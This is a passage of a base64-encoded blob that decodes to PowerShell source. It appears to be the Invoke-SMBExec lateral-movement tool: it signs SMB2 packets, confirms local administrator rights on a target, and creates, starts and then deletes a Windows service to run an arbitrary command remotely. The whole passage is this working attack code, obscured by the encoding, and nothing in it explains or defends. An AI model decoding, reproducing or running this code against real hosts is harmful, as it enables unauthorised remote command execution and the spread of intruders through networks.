UIyX2hlYWRlciArICRTTUIyX2RhdGEgKyAkUlBDX2RhdGEgKyAkU0NNX2RhdGENCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9zaWduYXR1cmUgPSAkSE1BQ19TSEEyNTYuQ29tcHV0ZUhhc2goJFNNQjJfc2lnbikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9zaWduYXR1cmUgPSAkU01CMl9zaWduYXR1cmVbMC4uMTVdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlclsiU01CMkhlYWRlcl9TaWduYXR1cmUiXSA9ICRTTUIyX3NpZ25hdHVyZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CMl9oZWFkZXINCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc2VuZCA9ICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSArICRTTUIyX2hlYWRlciArICRTTUIyX2RhdGEgKyAkUlBDX2RhdGEgKyAkU0NNX2RhdGENCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5Xcml0ZSgkU01CX2NsaWVudF9zZW5kLDAsJFNNQl9jbGllbnRfc2VuZC5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5GbHVzaCgpDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uUmVhZCgkU01CX2NsaWVudF9yZWNlaXZlLDAsJFNNQl9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ1JlYWRSZXF1ZXN0Jw0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2VfbmV4dCA9ICdDaGVja0FjY2VzcycgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgJ0NoZWNrQWNjZXNzJw0KICAgICAgICAgICAgICAgICAgICB7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFNNQl9jbGllbnRfcmVjZWl2ZVsxMjguLjEzMV0pIC1lcSAnMDAtMDAtMDAtMDAnIC1hbmQgW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkU01CX2NsaWVudF9yZWNlaXZlWzEwOC4uMTI3XSkgLW5lICcwMC0wMC0wMC0wMC0wMC0wMC0wMC0wMC0wMC0wMC0wMC0wMC0wMC0wMC0wMC0wMC0wMC0wMC0wMC0wMCcpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NlcnZpY2VfbWFuYWdlcl9jb250ZXh0X2hhbmRsZSA9ICRTTUJfY2xpZW50X3JlY2VpdmVbMTA4Li4xMjddDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9leGVjdXRlIC1lcSAkdHJ1ZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIiRvdXRwdXRfdXNlcm5hbWUgaXMgYSBsb2NhbCBhZG1pbmlzdHJhdG9yIG9uICRUYXJnZXQiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ0NyZWF0ZVNlcnZpY2VXJw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgIiRvdXRwdXRfdXNlcm5hbWUgaXMgYSBsb2NhbCBhZG1pbmlzdHJhdG9yIG9uICRUYXJnZXQiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX21lc3NhZ2VfSUQgKz0gMjANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbG9zZV9zZXJ2aWNlX2hhbmRsZV9zdGFnZSA9IDINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2UgPSAnQ2xvc2VTZXJ2aWNlSGFuZGxlJw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFNNQl9jbGllbnRfcmVjZWl2ZVsxMjguLjEzMV0pIC1lcSAnMDUtMDAtMDAtMDAnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiJG91dHB1dF91c2VybmFtZSBpcyBub3QgYSBsb2NhbCBhZG1pbmlzdHJhdG9yIG9uICRUYXJnZXQiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQkV4ZWNfZmFpbGVkID0gJHRydWUNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgIlNvbWV0aGluZyB3ZW50IHdyb25nIHdpdGggJFRhcmdldCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CRXhlY19mYWlsZWQgPSAkdHJ1ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgJ0NyZWF0ZVNlcnZpY2VXJw0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9tZXNzYWdlX0lEICs9IDIwDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfaGVhZGVyID0gR2V0LVBhY2tldFNNQjJIZWFkZXIgMHgwOSwweDAwICRTTUIyX21lc3NhZ2VfSUQgJFNNQjJfdHJlZV9JRCAkU01CX3Nlc3Npb25fSUQNCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXJbIlNNQjJIZWFkZXJfQ3JlZGl0UmVxdWVzdCJdID0gMHg3ZiwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRTTUJfc2lnbmluZykNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfaGVhZGVyWyJTTUIySGVhZGVyX0ZsYWdzIl0gPSAweDA4LDB4MDAsMHgwMCwweDAwICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU0NNX2RhdGEgPSBHZXQtUGFja2V0U0NNQ3JlYXRlU2VydmljZVcgJFNNQl9zZXJ2aWNlX21hbmFnZXJfY29udGV4dF9oYW5kbGUgJFNNQl9zZXJ2aWNlX2J5dGVzICRTTUJfc2VydmljZV9sZW5ndGggJFNNQkV4ZWNfY29tbWFuZF9ieXRlcyAkU01CRXhlY19jb21tYW5kX2xlbmd0aF9ieXRlcw0KICAgICAgICAgICAgICAgICAgICAgICAgJFNDTV9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TQ01fZGF0YQ0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2RhdGEgPSBHZXQtUGFja2V0U01CMldyaXRlUmVxdWVzdCAkU01CX2ZpbGVfSUQgJFNDTV9kYXRhLmxlbmd0aA0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9SUENfZGF0YSA9IEdldC1QYWNrZXRSUENSZXF1ZXN0IDB4MDMgJFNDTV9kYXRhLmxlbmd0aCAwIDAgMHgwMSwweDAwLDB4MDAsMHgwMCAweDAwLDB4MDAgMHgwYywweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfaGVhZGVyDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUIyX2RhdGEgDQogICAgICAgICAgICAgICAgICAgICAgICAkUlBDX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1JQQ19kYXRhIA0KICAgICAgICAgICAgICAgICAgICAgICAgJFJQQ19kYXRhX2xlbmd0aCA9ICRTTUIyX2RhdGEuTGVuZ3RoICsgJFNDTV9kYXRhLkxlbmd0aCArICRSUENfZGF0YS5MZW5ndGgNCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBHZXQtUGFja2V0TmV0QklPU1Nlc3Npb25TZXJ2aWNlICRTTUIyX2hlYWRlci5MZW5ndGggJFJQQ19kYXRhX2xlbmd0aA0KICAgICAgICAgICAgICAgICAgICAgICAgJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZigkU01CX3NpZ25pbmcpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfc2lnbiA9ICRTTUIyX2hlYWRlciArICRTTUIyX2RhdGEgKyAkUlBDX2RhdGEgKyAkU0NNX2RhdGENCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9zaWduYXR1cmUgPSAkSE1BQ19TSEEyNTYuQ29tcHV0ZUhhc2goJFNNQjJfc2lnbikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9zaWduYXR1cmUgPSAkU01CMl9zaWduYXR1cmVbMC4uMTVdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlclsiU01CMkhlYWRlcl9TaWduYXR1cmUiXSA9ICRTTUIyX3NpZ25hdHVyZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CMl9oZWFkZXINCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc2VuZCA9ICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSArICRTTUIyX2hlYWRlciArICRTTUIyX2RhdGEgKyAkUlBDX2RhdGEgKyAkU0NNX2RhdGENCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5Xcml0ZSgkU01CX2NsaWVudF9zZW5kLDAsJFNNQl9jbGllbnRfc2VuZC5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5GbHVzaCgpDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uUmVhZCgkU01CX2NsaWVudF9yZWNlaXZlLDAsJFNNQl9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ1JlYWRSZXF1ZXN0Jw0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2VfbmV4dCA9ICdTdGFydFNlcnZpY2VXJyAgDQogICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAnU3RhcnRTZXJ2aWNlVycNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFNNQl9jbGllbnRfcmVjZWl2ZVsxMzIuLjEzNV0pIC1lcSAnMDAtMDAtMDAtMDAnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlNlcnZpY2UgJFNNQl9zZXJ2aWNlIGNyZWF0ZWQgb24gJFRhcmdldCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NlcnZpY2VfY29udGV4dF9oYW5kbGUgPSAkU01CX2NsaWVudF9yZWNlaXZlWzExMi4uMTMxXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX21lc3NhZ2VfSUQgKz0gMjANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfaGVhZGVyID0gR2V0LVBhY2tldFNNQjJIZWFkZXIgMHgwOSwweDAwICRTTUIyX21lc3NhZ2VfSUQgJFNNQjJfdHJlZV9JRCAkU01CX3Nlc3Npb25fSUQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfaGVhZGVyWyJTTUIySGVhZGVyX0NyZWRpdFJlcXVlc3QiXSA9IDB4N2YsMHgwMA0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9zaWduaW5nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlclsiU01CMkhlYWRlcl9GbGFncyJdID0gMHgwOCwweDAwLDB4MDAsMHgwMCAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU0NNX2RhdGEgPSBHZXQtUGFja2V0U0NNU3RhcnRTZXJ2aWNlVyAkU01CX3NlcnZpY2VfY29udGV4dF9oYW5kbGUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU0NNX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NDTV9kYXRhDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2RhdGEgPSBHZXQtUGFja2V0U01CMldyaXRlUmVxdWVzdCAkU01CX2ZpbGVfSUQgJFNDTV9kYXRhLmxlbmd0aA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfUlBDX2RhdGEgPSBHZXQtUGFja2V0UlBDUmVxdWVzdCAweDAzICRTQ01fZGF0YS5sZW5ndGggMCAwIDB4MDEsMHgwMCwweDAwLDB4MDAgMHgwMCwweDAwIDB4MTMsMHgwMCANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfaGVhZGVyDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CMl9kYXRhIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSUENfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfUlBDX2RhdGEgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJQQ19kYXRhX2xlbmd0aCA9ICRTTUIyX2RhdGEuTGVuZ3RoICsgJFNDTV9kYXRhLkxlbmd0aCArICRSUENfZGF0YS5MZW5ndGgNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gR2V0LVBhY2tldE5ldEJJT1NTZXNzaW9uU2VydmljZSAkU01CMl9oZWFkZXIuTGVuZ3RoICRSUENfZGF0YV9sZW5ndGgNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkU01CX3NpZ25pbmcpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9zaWduID0gJFNNQjJfaGVhZGVyICsgJFNNQjJfZGF0YSArICRSUENfZGF0YSArICRTQ01fZGF0YQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9zaWduYXR1cmUgPSAkSE1BQ19TSEEyNTYuQ29tcHV0ZUhhc2goJFNNQjJfc2lnbikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfc2lnbmF0dXJlID0gJFNNQjJfc2lnbmF0dXJlWzAuLjE1XQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfaGVhZGVyWyJTTUIySGVhZGVyX1NpZ25hdHVyZSJdID0gJFNNQjJfc2lnbmF0dXJlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CMl9oZWFkZXINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zZW5kID0gJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlICsgJFNNQjJfaGVhZGVyICsgJFNNQjJfZGF0YSArICRSUENfZGF0YSArICRTQ01fZGF0YQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlRyeWluZyB0byBleGVjdXRlIGNvbW1hbmQgb24gJFRhcmdldCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uV3JpdGUoJFNNQl9jbGllbnRfc2VuZCwwLCRTTUJfY2xpZW50X3NlbmQuTGVuZ3RoKSA+ICRudWxsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLkZsdXNoKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uUmVhZCgkU01CX2NsaWVudF9yZWNlaXZlLDAsJFNNQl9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZSA9ICdSZWFkUmVxdWVzdCcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZV9uZXh0ID0gJ0RlbGV0ZVNlcnZpY2VXJyAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkU01CX2NsaWVudF9yZWNlaXZlWzEzMi4uMTM1XSkgLWVxICczMS0wNC0wMC0wMCcpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJTZXJ2aWNlICRTTUJfc2VydmljZSBjcmVhdGlvbiBmYWlsZWQgb24gJFRhcmdldCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CRXhlY19mYWlsZWQgPSAkdHJ1ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiU2VydmljZSBjcmVhdGlvbiBmYXVsdCBjb250ZXh0IG1pc21hdGNoIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJFeGVjX2ZhaWxlZCA9ICR0cnVlDQogICAgICAgICAgICAgICAgICAgICAgICB9DQogDQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgJ0RlbGV0ZVNlcnZpY2VXJw0KICAgICAgICAgICAgICAgICAgICB7IA0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZihbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRTTUJfY2xpZW50X3JlY2VpdmVbMTA4Li4xMTFdKSAtZXEgJzFkLTA0LTAwLTAwJykNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgIkNvbW1hbmQgZXhlY3V0ZWQgd2l0aCBzZXJ2aWNlICRTTUJfc2VydmljZSBvbiAkVGFyZ2V0Ig0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFNNQl9jbGllbnRfcmVjZWl2ZVsxMDguLjExMV0pIC1lcSAnMDItMDAtMDAtMDAnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiU2VydmljZSAkU01CX3NlcnZpY2UgZmFpbGVkIHRvIHN0YXJ0IG9uICRUYXJnZXQiDQogICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX21lc3NhZ2VfSUQgKz0gMjANCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXIgPSBHZXQtUGFja2V0U01CMkhlYWRlciAweDA5LDB4MDAgJFNNQjJfbWVzc2FnZV9JRCAkU01CMl90cmVlX0lEICRTTUJfc2Vzc2lvbl9JRA0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlclsiU01CMkhlYWRlcl9DcmVkaXRSZXF1ZXN0Il0gPSAweDdmLDB4MDANCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9zaWduaW5nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXJbIlNNQjJIZWFkZXJfRmxhZ3MiXSA9IDB4MDgsMHgwMCwweDAwLDB4MDANCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TQ01fZGF0YSA9IEdldC1QYWNrZXRTQ01EZWxldGVTZXJ2aWNlVyAkU01CX3NlcnZpY2VfY29udGV4dF9oYW5kbGUNCiAgICAgICAgICAgICAgICAgICAgICAgICRTQ01fZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU0NNX2RhdGENCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9kYXRhID0gR2V0LVBhY2tldFNNQjJXcml0ZVJlcXVlc3QgJFNNQl9maWxlX0lEICRTQ01fZGF0YS5sZW5ndGgNCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfUlBDX2RhdGEgPSBHZXQtUGFja2V0UlBDUmVxdWVzdCAweDAzICRTQ01fZGF0YS5sZW5ndGggMCAwIDB4MDEsMHgwMCwweDAwLDB4MDAgMHgwMCwweDAwIDB4MDIsMHgwMA0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfaGVhZGVyID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUIyX2hlYWRlcg0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CMl9kYXRhIA0KICAgICAgICAgICAgICAgICAgICAgICAgJFJQQ19kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9SUENfZGF0YSANCiAgICAgICAgICAgICAgICAgICAgICAgICRSUENfZGF0YV9sZW5ndGggPSAkU01CMl9kYXRhLkxlbmd0aCArICRTQ01fZGF0YS5MZW5ndGggKyAkUlBDX2RhdGEuTGVuZ3RoDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gR2V0LVBhY2tldE5ldEJJT1NTZXNzaW9uU2VydmljZSAkU01CMl9oZWFkZXIuTGVuZ3RoICRSUENfZGF0YV9sZW5ndGgNCiAgICAgICAgICAgICAgICAgICAgICAgICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UNCg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9zaWduaW5nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX3NpZ24gPSAkU01CMl9oZWFkZXIgKyAkU01CMl9kYXRhICsgJFJQQ19kYXRhICsgJFNDTV9kYXRhDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfc2lnbmF0dXJlID0gJEhNQUNfU0hBMjU2LkNvbXB1dGVIYXNoKCRTTUIyX3NpZ24pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfc2lnbmF0dXJlID0gJFNNQjJfc2lnbmF0dXJlWzAuLjE1XQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXJbIlNNQjJIZWFkZXJfU2lnbmF0dXJlIl0gPSAkU01CMl9zaWduYXR1cmUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfaGVhZGVyDQogICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3NlbmQgPSAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgKyAkU01CMl9oZWFkZXIgKyAkU01CMl9kYXRhICsgJFJQQ19kYXRhICsgJFNDTV9kYXRhDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uV3JpdGUoJFNNQl9jbGllbnRfc2VuZCwwLCRTTUJfY2xpZW50X3NlbmQuTGVuZ3RoKSA+ICRudWxsDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uRmx1c2goKQ0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLlJlYWQoJFNNQl9jbGllbnRfcmVjZWl2ZSwwLCRTTUJfY2xpZW50X3JlY2VpdmUuTGVuZ3RoKSA+ICRudWxsDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZSA9ICdSZWFkUmVxdWVzdCcNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlX25leHQgPSAnQ2xvc2VTZXJ2aWNlSGFuZGxlJw0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbG9zZV9zZXJ2aWNlX2hhbmRsZV9zdGFnZSA9IDENCiAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICdDbG9zZVNlcnZpY2VIYW5kbGUnDQogICAgICAgICAgICAgICAgICAgIHsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9jbG9zZV9zZXJ2aWNlX2hhbmRsZV9zdGFnZSAtZXEgMSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJTZXJ2aWNlI